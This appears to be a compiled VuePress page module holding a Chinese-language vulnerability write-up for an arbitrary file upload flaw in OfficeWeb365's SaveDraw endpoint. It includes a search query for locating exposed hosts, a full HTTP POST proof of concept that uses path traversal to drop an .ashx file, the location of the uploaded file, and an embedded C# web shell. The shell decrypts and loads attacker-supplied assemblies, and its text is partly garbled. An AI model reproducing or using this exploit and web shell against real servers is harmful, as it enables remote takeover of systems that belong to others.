import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as t,e as n}from"./app-58e4a7d6.js";const i={},s=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>OfficeWeb365 SaveDraw 接口存在任意文件上传漏洞，攻击者通过漏洞可以在服务器中上传任意文件获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>OfficeWeb365</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&quot;OfficeWeb365&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>产品页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828143123592.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>验证POC</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /PW/SaveDraw?path=../../Content/img&amp;idx=6.ashx HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.434.18 Safari/537.36
Content-Length: 990
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Connection: close

data:image/png;base64,01s34567890123456789y12345678901234567m91&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt;using System;using System.I0;using System.Reflection;using System.Text;using System.Web;using System.WebSessionState;using&amp;System.Security.Cryptography;public class Handler : IHttpHandler,IRequiresSessionState{public void=&amp;ProcessRequest(HttpContext context){try{string key=&quot;900bc885d7553375&quot;;byteDk=&amp;Encoding.Default.GetBytes(key);context.Session.AddC&quot;sky&quot;, key);StreamReader sr=new&amp;StreamReader(contextRequest.InputStream);string line=sr.ReadLine;if(!string.IsNullOrEmpty(line)){byteDc=&amp;Convert.FromBase64String(line);Assembly assembly=&amp;typeof(Environment).Assembly;RijndaelManaged rm=(RijndaelManaged)&amp;assembly.CreateInstance(&quot;System.Secur&quot;+&quot;ityCrypto&quot;+&quot;graphy.Rijnda&quot;+&quot;elm anaged&quot;);byte[ data=rm.CreateDecryptorCk,k)TransformFinalBlock(c,0, c.Length);Assembly.Load(data)CreateInstance(&quot;U&quot;).Equals(context);sr.clo se();}}catch {}}public bool IsReusable{get{return false;}}}}---
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20230828143155818.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>上传地址</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/Content/img/UserDraw/drawPW6.ashx
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,14),r=[s];function d(l,o){return a(),t("div",null,r)}const m=e(i,[["render",d],["__file","OfficeWeb365 SaveDraw 任意文件上传漏洞.html.vue"]]);export{m as default};
